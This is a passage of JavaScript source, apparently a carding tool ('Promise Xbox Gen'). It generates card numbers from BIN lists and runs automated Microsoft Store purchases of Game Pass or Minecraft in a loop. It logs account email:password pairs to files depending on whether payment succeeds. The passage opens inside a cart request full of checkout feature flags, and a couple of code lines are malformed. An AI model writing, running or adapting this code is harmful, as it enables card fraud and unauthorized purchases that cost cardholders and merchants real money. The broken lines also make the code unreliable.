                "sc_xaaconversionexpirationdate",
                "sc_helptypescript",
                "sc_newdemandsandneedsstatement",
                "sc_citizensoneallowed",
                "sc_riskfatal",
                "sc_renewtreatmenta",
                "sc_trialtreatmenta",
                "sc_cartzoomfix",
                "sc_useofficeonlyinternalendpoint",
                "sc_gotopurchase",
                "sc_endallactivities",
                "sc_headingheader",
                "sc_flexsubs",
                "sc_useanchorcomponent",
                "sc_addbillingaddresstelemetry",
                "sc_scenariotelemetryrefactor",
                "sc_checkoutsmd",
                "sc_scenariosupportupdate",
                "sc_bankchallengecheckout",
                "sc_addpaymenttelemetry",
                "sc_railv2",
                "sc_checkoutglobalpiadd",
                "sc_reactcheckout",
                "sc_xboxgotocart",
                "sc_hidewarningevents",
                "sc_xboxcomnosapi",
                "sc_clientdebuginfo",
                "sc_routebacktocartforoutofstock",
                "sc_koreanlegalterms",
                "sc_refactorprorate",
                "sc_paymentoptionnotfound",
                "sc_pidlflights",
                "sc_fixcolorcontrastforrecommendeditems",
                "sc_hideeditbuttonwhenediting",
                "sc_enablekakaopay",
                "sc_handlecememptyresponse",
                "sc_ordercheckoutfix",
                "sc_xboxpmgrouping",
                "sc_stickyfooter",
                "sc_gotoredmrepl",
                "sc_partnernametelemetry",
                "sc_jpregionconversion",
                "sc_checkoutorderedpv",
                "sc_maxaddresslinelength",
                "sc_componentexception",
                "sc_buynowuipreload",
                "sc_updatebillinginfo",
                "sc_newshippingmethodtelemetry",
                "sc_checkoutbannertelemetry",
                "sc_learnmoreclcid",
                "sc_satisfiedcheckout",
                "sc_checkboxarialabel",
                "sc_newlegaltextlayout",
                "sc_newpagetitle",
                "sc_prepaidcardsv3",
                "sc_gamertaggifting",
                "sc_checkoutargentinafee",
                "sc_xboxcomasyncpurchase",
                "sc_sameaddressdefault",
                "sc_fixcolorcontrastforcheckout",
                "sc_checkboxkg",
                "sc_usebuynowbusinesslogic",
                "sc_skypenonactiveerror",
                "sc_skippurchaseconfirm",
                "sc_activitymonitorasyncpurchase",
                "sc_shareddowngrade",
                "sc_allowedpisenabled",
                "sc_xboxoos",
                "sc_eligibilityapi",
                "sc_koreatransactionfeev1",
                "sc_removesetpaymentmethod",
                "sc_ordereditforincompletedata",
                "sc_cppidlerror",
                "sc_bankchallenge",
                "sc_allowelo",
                "sc_delayretry",
                "sc_loadtestheadersenabled",
                "sc_hideexpirydate",
                "sc_migrationforcitizenspay",
                "sc_conversionblockederror",
                "sc_mcrenewaldatev2",
                "sc_allowpaysafecard",
                "sc_purchasedblocked",
                "sc_outofstock",
                "sc_selectpmonaddfailure",
                "sc_allowcustompifiltering",
                "sc_purchaseblockerrorhandling",
                "sc_errorpageviewfix",
                "sc_windowsdevkitname",
                "sc_xboxredirection",
                "sc_usebuynowonlynonprodendpoint",
                "sc_getmoreinfourl",
                "sc_disablefilterforuserconsent",
                "sc_suppressrecoitem",
                "sc_dcccattwo",
                "sc_hipercard",
                "sc_resellerdetail",
                "sc_newlowbardiscountstring",
                "sc_fixpidladdpisuccess",
                "sc_moderngamertaggifting",
                "sc_xdlshipbuffer",
                "sc_allowverve",
                "sc_inlinetempfix",
                "sc_ineligibletostate",
                "sc_greenshipping",
                "sc_trackinitialcheckoutload",
                "sc_showlegalstringforproducttypepass",
                "sc_blocklegacyupgrade",
                "sc_newduplicatesubserror",
                "sc_xboxgamepad",
                "sc_xboxspinner",
                "sc_xboxclosebutton",
                "sc_xboxuiexp",
                "sc_disabledefaultstyles",
                "sc_gamertaggifting"
            ],
            itemsToAdd: {}
        })
    }).then(res => res.json());

    if (purchaseStatus.cart && purchaseStatus.cart.orderState === 'Purchased') {
        console.log(`[${chalk.green('+')}] Purchase succeeded (${email})`);
        fs.appendFileSync('./gamepass.txt', `${email}:${password}\n`);
    } else {
        fs.appendFileSync('./card-accounts.txt', `${email}:${password}\n`);
        console.log(`[${chalk.red('-')}] Payment failed! (${purchaseStatus.events.cart[0].data.reason} / ${purchaseStatus.events.cart[0].data.subReasons ? `${purchaseStatus.events.cart[0].data.subReasons.join(', ')} / ` : ''}${email})`);
    }
};

const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

(async () => {
    process.title = 'Promise Xbox Gen | https://pr0mise.net';

    const telegram = await dns.resolveTxt('telegram.pr0mise.net');
    const discord = await dns.resolveTxt('discord.pr0mise.net');

    console.clear();
    
    console.log(`${chalk.blueBright('==================================================')}`);
    console.log('');
    console.log(`Telegram : ${chalk.blueBright(telegram[0][0])}`);
    console.log(`Discord : ${chalk.blueBright(discord[0][0])}`);
    console.log('');
    console.log(`1. ${chalk.gray('Xbox Ultimate Gamepass')}`);
    console.log(`2. ${chalk.gray('Xbox PC Gamepass')}`);
    console.log(`3. ${chalk.gray('Minecraft')}`);
    console.log(`4. ${chalk.gray('Custom')}`);
    console.log('');
    console.log(`${chalk.blueBright('==================================================')}`);

    const option = await rl.question(`${chalk.gray('> ')}`);

    if (option === '1') {
        productId = 'cfq7ttc0khs0';
        skuId = '0007';
        console.log(`[${chalk.green('+')}] Set to Xbox Ultimate Gamepass`);
    } else if (option === '2') {
        productId = 'cfq7ttc0kgq8`';
        skuId = '0010';
        console.log(`[${chalk.green('+')}] Set to Xbox PC Gamepass`);
    } else if (option === '3') {
        productId = '9NXP44L49SHJ';
        skuId = '0002';
        console.log(`[${chalk.green('+')}] Set to Minecraft`);
    } else if (option === '4') {
        productId = await rl.question([]`${chalk.yellowBright('?')}] Enter product Id : `);
        skuId = await rl.question(`[${chalk.yellowBright('?')}] Enter sku Id : `);
    } else {
        console.log(`[${chalk.redBright('!')}] Invalid option`);
        process.exit(-1);
    }

    console.log('');

    const bins = fs.readFileSync('./bins.txt', 'utf-8').split(/\r?\n/);

    if (bins.length === 0) {
        console.log(`[${chalk.redBright('!')}] No bins found in bins.txt`);
        process.exit(-1);
    }

    for (let bin of bins) {
        const binInfo = bin.match(/^([\dx]{16})\|(\d{2})\|(\d{4})\|(\d{3})\|([a-z]{2}-[A-Z]{2})\|(.*)$/);
        
        if (!binInfo) {
            console.log(`[${chalk.redBright('!')}] I wasn't able to parse the bin ${bin}.`);
            process.exit(-1);
        }

        cards.push(...generateCardNumber(binInfo[1]).map(card => {
            return {
                cardNumber: card,
                expMonth: binInfo[2],
                expYear: binInfo[3],
                cvv: binInfo[4],
                countryCode: binInfo[5],
                postalCode: binInfo[6]
            }
        }));

        console.log(`[${chalk.green('+')}] Successfully parsed ${bin}`);
    }

    console.log(`[${chalk.green('+')}] Added ${cards.length} cards to the queue`);

    if (process.argv.includes('-test')) {
        console.log(`[${chalk.yellow('@')}] Running in test mode`);
        generate();
    } else {
        while (running) {
            generate();
            await wait(config.delay);
        }
    }
})();